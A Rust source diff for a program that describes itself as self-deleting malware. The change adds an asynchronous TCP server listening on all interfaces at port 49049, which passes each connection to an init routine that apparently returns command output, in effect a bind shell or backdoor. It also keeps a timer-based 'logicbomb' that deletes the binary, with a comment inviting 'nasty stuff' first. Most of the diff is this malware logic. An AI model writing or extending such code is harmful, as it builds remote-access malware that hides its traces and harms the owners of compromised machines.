@@ -1,5 +1,4 @@
 use std::{
-    env,
     error::Error,
     fs,
     path::{self, PathBuf},
@@ -46,10 +45,11 @@ fn timer(count: u64, max_count: u64) -> bool {
         /* You can do nasty stuff here
         before deleting the binary. */
     }
-    return logicbomb;
+    logicbomb
 }
 
-fn main() -> Result<(), Box<dyn Error>> {
+#[tokio::main]
+async fn main() -> Result<(), Box<dyn Error>> {
     /* Main Function */
     eprintln!("Started self-deleting malware testing.");
     let mut bin_path: path::PathBuf = match get_malware_path() {
@@ -61,13 +61,31 @@ fn main() -> Result<(), Box<dyn Error>> {
     };
 
     let pid = process::id();
+    let listener = tokio::net::TcpListener::bind("0.0.0.0:49049").await?;
+    eprintln!("tcp server started at 49049");
+    tokio::task::spawn(async move {
+        loop {
+            let (socket, _) = match listener.accept().await {
+                Ok((v, e)) => (v, e),
+                Err(_) => {
+                    eprintln!("exiting");
+                    std::process::exit(1)
+                }
+            };
+            match operations::onstart::init(socket).await {
+                Ok(command_out) => {
+                    println!("{:?}", command_out)
+                }
+                Err(_) => eprintln!("disconnected"),
+            }
+        }
+    });
 
-    // thread for process daemonization
-    let handle = thread::spawn(move || {
+    // thread to continue counting.
+    let timer = tokio::task::spawn_blocking(move || {
         dbg!(&bin_path, pid);
 
         let mut counter: u64 = 0;
-        operations::onstart::init();
         loop {
             bin_path = get_malware_path().expect("something went wrong within the thread");
             if timer(counter, 30) {
@@ -82,11 +100,7 @@ fn main() -> Result<(), Box<dyn Error>> {
             counter += 1;
         }
     });
-    match handle.join() {
-        Ok(()) => (),
-        Err(_e) => {
-            process::exit(1);
-        }
-    };
+
+    tokio::join!(timer).0.unwrap();
     Ok(())
 }
